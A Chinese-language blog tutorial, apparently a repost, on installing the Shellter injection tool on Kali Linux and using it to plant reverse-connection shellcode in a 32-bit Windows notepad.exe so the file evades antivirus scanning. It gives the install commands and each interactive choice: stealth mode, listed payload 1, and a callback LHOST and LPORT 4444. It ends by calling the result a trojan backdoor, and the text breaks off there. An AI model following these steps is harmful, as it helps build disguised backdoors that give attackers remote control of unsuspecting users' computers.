# kali 免杀工具shellter安装以及使用



[搬瓦工VPS 2021最新优惠码（最新完整版）](https://www.e-learn.cn/content/qita/1200334)





由 回眸只為那壹抹淺笑 提交于 2020-08-13 06:22:59

Shellter 是一款动态 shellcode 注入工具，我们可以将shellcode注入到其它程序上，从而来躲避杀毒软件的查杀。俗称为免杀

官网：https://www.shellterproject.com/ 目前最新版本是7.2，主程序是.exe文件所以在windows下可以直接使用，在linux上运行的话

就需要安装wine环境来运行。我使用的Kali Linux 版本是kali-linux-2020.2目前最新版本 注意的是shellter目前只能注入32位的可执行文件

**开始安装：**

**1.  apt-get update    //更新一下**
**2.  apt-get install shellter  //直接apt在线安装**

**![img](https://img2020.cnblogs.com/blog/777998/202005/777998-20200518203511917-337449346.png)**

 

安装完成后 ，终端直接输入shellter打开会报错，根据提示 我们直接执行命令 dpkg --add-architecture i386 && apt-get update && apt-get install wine32

确认安装即可

![img](https://img2020.cnblogs.com/blog/777998/202005/777998-20200518204705147-975113740.png)

![img](https://img2020.cnblogs.com/blog/777998/202005/777998-20200518204745832-936560773.png)

现在我们打开shellter就可以打开运行了，工具安装完成后再/usr/share/windows-resources/shellter 这个文件夹

shellter目录下的Shellter_Backups文件夹是你注入文件后备份的文件夹，会自动把原文件备份一个到这个文件夹下。

 

**免杀实验：**

**![img](https://img2020.cnblogs.com/blog/777998/202005/777998-20200518205138033-2007052412.png)**

 

**Choose Operation Mode - Auto/Manual (A/M/H)：A      //选择模式 A 自动模式自动注入后门，M高级模式，H帮助**

**PE Target：/home/notepad.exe      // 注入的程序 这里已windows系统自带的32位记事本程序举例**

![img](https://img2020.cnblogs.com/blog/777998/202005/777998-20200518210823635-1306282893.png)

**Enable Stealth Mode? (Y/N/H): Y        //是否启用隐身模式 输入Y启用**

**Use a listed payload or custom? (L/C/H): L     //使用攻击模块列表或者自定义？ 输入L 选择Payload**

**Select payload by index: 1   //选择第一个**

**![img](https://img2020.cnblogs.com/blog/777998/202005/777998-20200518211202468-1208790198.png)**

 

**SET LHOST： 192.168.37.137  //设置反弹回来的IP 本机**

**SET LPORT：4444     //设置接收反弹的端口**

**![img](https://img2020.cnblogs.com/blog/777998/202005/777998-20200518211545439-1925527061.png)**

这样我们的木马后门shellcode就注入到这个文件里去了，